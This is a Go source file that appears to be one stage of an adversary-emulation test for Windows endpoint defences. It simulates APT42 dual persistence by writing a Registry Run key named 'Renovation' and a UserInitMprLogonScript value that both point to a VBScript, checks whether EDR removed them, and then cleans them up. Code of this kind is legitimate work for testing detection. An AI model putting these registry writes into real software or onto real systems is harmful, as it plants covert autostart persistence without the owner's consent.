//go:build windows

/*
STAGE 3: Boot or Logon Autostart Execution - Registry Run Keys (T1547.001)
Also covers T1037.001 (Logon Script)
Establishes dual persistence via:

	(a) Registry Run key "Renovation" pointing to payload
	(b) UserInitMprLogonScript registry value for logon script persistence

Simulates APT42 dual persistence mechanism for maximum resilience.

When running as SYSTEM (typical Prelude agent context), uses HKLM for
machine-wide persistence and skips user-profile-only mechanisms.
*/
package main

import (
	"fmt"
	"os"
	"strings"

	"golang.org/x/sys/windows/registry"
)

const (
	TEST_UUID      = "92b0b4f6-a09b-4c7b-b593-31ce461f804c"
	TECHNIQUE_ID   = "T1547.001"
	TECHNIQUE_NAME = "Dual Persistence Mechanism"
	STAGE_ID       = 3
)

const (
	StageSuccess     = 0
	StageBlocked     = 126
	StageQuarantined = 105
	StageError       = 999
)

// Persistence tracking for cleanup
var persistenceCreated []string

// Registry root selected based on execution context
var regRoot registry.Key
var regRootName string

func isSystemContext() bool {
	username := os.Getenv("USERNAME")
	return strings.HasSuffix(username, "$") || strings.EqualFold(username, "SYSTEM")
}

func main() {
	AttachLogger(TEST_UUID, fmt.Sprintf("Stage %d: %s", STAGE_ID, TECHNIQUE_ID))

	LogMessage("INFO", TECHNIQUE_ID, "Starting dual persistence mechanism simulation")
	LogStageStart(STAGE_ID, TECHNIQUE_ID, "Dual persistence via Registry Run key + UserInitMprLogonScript")

	// Detect execution context and select appropriate registry root
	if isSystemContext() {
		regRoot = registry.LOCAL_MACHINE
		regRootName = "HKLM"
		fmt.Printf("[STAGE %s] Running as SYSTEM — using HKLM for machine-wide persistence\n", TECHNIQUE_ID)
		LogMessage("INFO", TECHNIQUE_ID, "SYSTEM context detected — targeting HKLM for persistence")
	} else {
		regRoot = registry.CURRENT_USER
		regRootName = "HKCU"
		fmt.Printf("[STAGE %s] Running as user — using HKCU for user-level persistence\n", TECHNIQUE_ID)
		LogMessage("INFO", TECHNIQUE_ID, "User context detected — targeting HKCU for persistence")
	}

	if err := performTechnique(); err != nil {
		errStr := strings.ToLower(err.Error())
		if strings.Contains(errStr, "access is denied") ||
			strings.Contains(errStr, "blocked") ||
			strings.Contains(errStr, "prevented") ||
			strings.Contains(errStr, "tamper") {
			fmt.Printf("[STAGE %s] Technique blocked: %v\n", TECHNIQUE_ID, err)
			LogMessage("BLOCKED", TECHNIQUE_ID, fmt.Sprintf("Technique blocked: %v", err))
			LogStageBlocked(STAGE_ID, TECHNIQUE_ID, err.Error())
			cleanupPersistence()
			os.Exit(StageBlocked)
		}

		fmt.Printf("[STAGE %s] Technique failed: %v\n", TECHNIQUE_ID, err)
		LogMessage("ERROR", TECHNIQUE_ID, fmt.Sprintf("Technique failed: %v", err))
		LogStageEnd(STAGE_ID, TECHNIQUE_ID, "error", err.Error())
		cleanupPersistence()
		os.Exit(StageError)
	}

	// Clean up persistence mechanisms after successful simulation
	cleanupPersistence()

	LogMessage("SUCCESS", TECHNIQUE_ID, "Dual persistence mechanisms created and cleaned up successfully")
	LogStageEnd(STAGE_ID, TECHNIQUE_ID, "success", "Persistence mechanisms established - EDR did not prevent")
	os.Exit(StageSuccess)
}

func performTechnique() error {
	// Step 1: Create Registry Run key persistence (T1547.001)
	// APT42 uses value name "Renovation" - a known IOC
	fmt.Printf("[STAGE %s] Creating Registry Run key persistence (value: 'Renovation')...\n", TECHNIQUE_ID)
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Creating %s\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Renovation", regRootName))

	runKeyPath := `Software\Microsoft\Windows\CurrentVersion\Run`
	runValueName := "Renovation"
	// Payload path simulating TAMECAT persistence pointing to VBScript
	runValueData := `cscript.exe //Nologo //B "c:\F0\update_check.vbs"`

	key, err := registry.OpenKey(regRoot, runKeyPath, registry.SET_VALUE|registry.QUERY_VALUE)
	if err != nil {
		return fmt.Errorf("failed to open %s\\%s: %v", regRootName, runKeyPath, err)
	}
	defer key.Close()

	err = key.SetStringValue(runValueName, runValueData)
	if err != nil {
		return fmt.Errorf("failed to write %s\\%s\\%s: %v", regRootName, runKeyPath, runValueName, err)
	}

	persistenceCreated = append(persistenceCreated, "run_key")
	fmt.Printf("[STAGE %s] Registry Run key created: %s\\...\\Run\\%s = %s\n", TECHNIQUE_ID, regRootName, runValueName, runValueData)
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Run key created: %s\\...\\Run\\%s = %s", regRootName, runValueName, runValueData))

	// Verify the value was actually written (not silently dropped by EDR)
	readVal, _, readErr := key.GetStringValue(runValueName)
	if readErr != nil || readVal != runValueData {
		fmt.Printf("[STAGE %s] Run key verification failed - value may have been silently removed by EDR\n", TECHNIQUE_ID)
		LogMessage("WARN", TECHNIQUE_ID, "Run key write succeeded but verification failed - possible silent EDR removal")
		return fmt.Errorf("Run key persistence blocked: value silently removed by security controls")
	}
	fmt.Printf("[STAGE %s] Run key verification: CONFIRMED\n", TECHNIQUE_ID)
	LogMessage("INFO", TECHNIQUE_ID, "Run key persistence verified - value persists in registry")

	// Step 2: Create UserInitMprLogonScript persistence (T1037.001)
	// This is a user-profile-only mechanism — skip when running as SYSTEM
	if isSystemContext() {
		fmt.Printf("[STAGE %s] Skipping UserInitMprLogonScript (SYSTEM context has no user profile)\n", TECHNIQUE_ID)
		LogMessage("INFO", TECHNIQUE_ID, "Skipping UserInitMprLogonScript — not applicable in SYSTEM context")
	} else {
		fmt.Printf("[STAGE %s] Creating UserInitMprLogonScript persistence...\n", TECHNIQUE_ID)
		LogMessage("INFO", TECHNIQUE_ID, "Creating HKCU\\Environment\\UserInitMprLogonScript")

		envKeyPath := `Environment`
		logonScriptValue := `c:\F0\update_check.vbs`

		envKey, err := registry.OpenKey(registry.CURRENT_USER, envKeyPath, registry.SET_VALUE|registry.QUERY_VALUE)
		if err != nil {
			envKey, _, err = registry.CreateKey(registry.CURRENT_USER, envKeyPath, registry.SET_VALUE|registry.QUERY_VALUE)
			if err != nil {
				return fmt.Errorf("failed to open HKCU\\%s: %v", envKeyPath, err)
			}
		}
		defer envKey.Close()

		err = envKey.SetStringValue("UserInitMprLogonScript", logonScriptValue)
		if err != nil {
			return fmt.Errorf("failed to write HKCU\\%s\\UserInitMprLogonScript: %v", envKeyPath, err)
		}

		persistenceCreated = append(persistenceCreated, "logon_script")
		fmt.Printf("[STAGE %s] UserInitMprLogonScript created: %s\n", TECHNIQUE_ID, logonScriptValue)
		LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("UserInitMprLogonScript created: %s", logonScriptValue))

		// Verify UserInitMprLogonScript
		readVal2, _, readErr2 := envKey.GetStringValue("UserInitMprLogonScript")
		if readErr2 != nil || readVal2 != logonScriptValue {
			fmt.Printf("[STAGE %s] UserInitMprLogonScript verification failed\n", TECHNIQUE_ID)
			LogMessage("WARN", TECHNIQUE_ID, "UserInitMprLogonScript verification failed - possible EDR removal")
			return fmt.Errorf("UserInitMprLogonScript persistence blocked: value silently removed")
		}
		fmt.Printf("[STAGE %s] UserInitMprLogonScript verification: CONFIRMED\n", TECHNIQUE_ID)
		LogMessage("INFO", TECHNIQUE_ID, "UserInitMprLogonScript persistence verified")
	}

	// Summary
	fmt.Printf("[STAGE %s] Persistence established via %s:\n", TECHNIQUE_ID, regRootName)
	fmt.Printf("[STAGE %s]   1. %s\\...\\Run\\Renovation -> %s\n", TECHNIQUE_ID, regRootName, runValueData)
	if !isSystemContext() {
		fmt.Printf("[STAGE %s]   2. HKCU\\Environment\\UserInitMprLogonScript -> c:\\F0\\update_check.vbs\n", TECHNIQUE_ID)
	}
	LogMessage("INFO", TECHNIQUE_ID, "Persistence mechanisms active")

	return nil
}

// cleanupPersistence removes all persistence mechanisms created during the test
func cleanupPersistence() {
	fmt.Printf("[STAGE %s] Cleaning up persistence mechanisms...\n", TECHNIQUE_ID)
	LogMessage("INFO", TECHNIQUE_ID, "Cleaning up persistence mechanisms")

	for _, mechanism := range persistenceCreated {
		switch mechanism {
		case "run_key":
			key, err := registry.OpenKey(regRoot,
				`Software\Microsoft\Windows\CurrentVersion\Run`, registry.SET_VALUE)
			if err == nil {
				key.DeleteValue("Renovation")
				key.Close()
				fmt.Printf("[STAGE %s] Cleaned up: %s Run key 'Renovation'\n", TECHNIQUE_ID, regRootName)
				LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Cleaned up %s Run key 'Renovation'", regRootName))
			}

		case "logon_script":
			key, err := registry.OpenKey(registry.CURRENT_USER,
				`Environment`, registry.SET_VALUE)
			if err == nil {
				key.DeleteValue("UserInitMprLogonScript")
				key.Close()
				fmt.Printf("[STAGE %s] Cleaned up: UserInitMprLogonScript\n", TECHNIQUE_ID)
				LogMessage("INFO", TECHNIQUE_ID, "Cleaned up UserInitMprLogonScript")
			}
		}
	}

	fmt.Printf("[STAGE %s] Persistence cleanup complete\n", TECHNIQUE_ID)
	LogMessage("INFO", TECHNIQUE_ID, "All persistence mechanisms removed")
}
